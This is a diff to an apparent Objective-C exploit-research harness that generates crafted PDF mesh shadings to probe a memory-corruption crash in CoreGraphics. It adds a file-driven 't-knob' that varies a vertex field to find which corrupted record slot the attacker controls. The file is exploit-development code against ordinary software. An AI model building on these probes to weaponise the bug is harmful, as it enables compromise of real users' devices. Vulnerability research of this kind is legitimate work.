@@ -37,7 +37,7 @@
 #import <string.h>
 #import <unistd.h>
 
-#define P112_BUILD @"p112-cgshading-v1.3-geomknob"
+#define P112_BUILD @"p112-cgshading-v1.4-tknob"
 
 /* Oracle constants, pinned to the generator (analysis §3-4):
    BPCOORD 32 ∈ {1,2,4,8,12,16,24,32}; BPCOMP 8 ∈ {1,2,4,8,12,16}; VPR 2.
@@ -97,6 +97,15 @@ static uint64_t g_p112_pat;   /* the in-flight sweep's chosen-double bits     */
    with this knob = the real value-control law; far constant again =
    the smashed slot is a different record field (which one = decode).  */
 static uint32_t g_p112_geom = 0x20000000u;
+/* v1.4 T-KNOB: the per-vertex t component (BitsPerComponent-byte, decoded
+   via /Decode [... 0 1]). Every vertex packs t=0x00 today; the far has
+   survived the function knob AND the geometry knob, so the remaining
+   in-record variable is t (and R). far(t) moving = the knob; constant
+   again = the smashed slot is an R/indexed or internal-constant field
+   and the decode moves to the userland DSC (cg_shading_type5_draw
+   +1876 is the inlined death site; the kernelcache does not carry
+   CoreGraphics). */
+static uint8_t g_p112_tcomp = 0x00;
 
 /* ---- v1.1 bandit (LabBandit shared harness): the sweep ORDER arms --------
    Both arms sweep the same four chosen doubles — only the ORDER differs,
@@ -215,7 +224,7 @@ static NSMutableData *p112_build_pdf(int range_dim, double value) {
        the site-law walk) carries the geometry knob g_p112_geom.           */
     uint32_t vx[4] = {0x10000000u, 0x20000000u, 0x10000000u, g_p112_geom};
     uint32_t vy[4] = {0x10000000u, 0x10000000u, 0x20000000u, g_p112_geom};
-    for (vi = 0; vi < 4; vi++) vlen += p112_pack_vertex(vstream + vlen, vx[vi], vy[vi], 0x00);
+    for (vi = 0; vi < 4; vi++) vlen += p112_pack_vertex(vstream + vlen, vx[vi], vy[vi], g_p112_tcomp);
 
     /* the double knob: one %g per dim, decimal (CG parses it back exactly
        for these sweep values); /Range = [0 1] x R (clamp keeps the value)   */
@@ -465,6 +474,26 @@ static int p112_render(NSMutableData *pdf, NSString *tag) {
                 Lf(@"[v1.3] GEOMETRY KNOB: vertex[3] x=y=0x%08x (decode "
                    @"/Decode [0 200] -> %.17g). far(gx) row this tap.",
                    gx, 200.0 * (double)gx / 4294967296.0);
+            }
+        }
+    }
+
+    /* v1.4 t-knob: Documents/p112_tcomp.txt = HEX byte applied to every
+       vertex's t component. far(t) row per force-quit. */
+    {
+        NSString *gpath = [[NSString alloc] initWithContentsOfFile:
+            [[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,
+             NSUserDomainMask, YES) firstObject]
+             stringByAppendingPathComponent:@"p112_tcomp.txt"]
+                          encoding:NSUTF8StringEncoding error:nil];
+        NSString *t2 = [gpath stringByTrimmingCharactersInSet:
+            [NSCharacterSet whitespaceAndNewlineCharacterSet]];
+        if (t2.length) {
+            unsigned int tv = 0;
+            if (sscanf(t2.UTF8String, "%x", &tv) == 1 && tv <= 0xFF) {
+                g_p112_tcomp = (uint8_t)tv;
+                Lf(@"[v1.4] T-KNOB: per-vertex t=0x%02x (decode 0 1 -> %.17g). "
+                   @"far(t) row this tap.", tv, (double)tv / 255.0);
             }
         }
     }
